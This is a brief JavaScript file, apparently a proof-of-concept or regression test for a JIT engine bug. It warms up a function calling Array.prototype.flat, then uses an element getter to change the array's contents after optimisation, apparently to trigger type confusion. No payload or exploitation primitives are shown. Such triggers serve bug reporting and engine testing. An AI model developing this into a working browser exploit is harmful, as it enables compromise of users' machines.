let trigger = false;

function f(a) {
    const result_array = a.flat();
    const overlapping_obj = { a: 1.1, b: 2.2, c: 3.3, d: 4.4 };
    if (trigger) {
        overlapping_obj.a = {};
    }
    return result_array;
}

const a = [1.1, 2.2, 3.3];
Object.defineProperty(a, 0, {
    get() {
        if (trigger) {
            a[1] = {};
        }
        return 1.1;
    },
    configurable: true,
});

for (let i = 0; i < 25000; ++i) {
    f(a);
}

trigger = true;
f(a);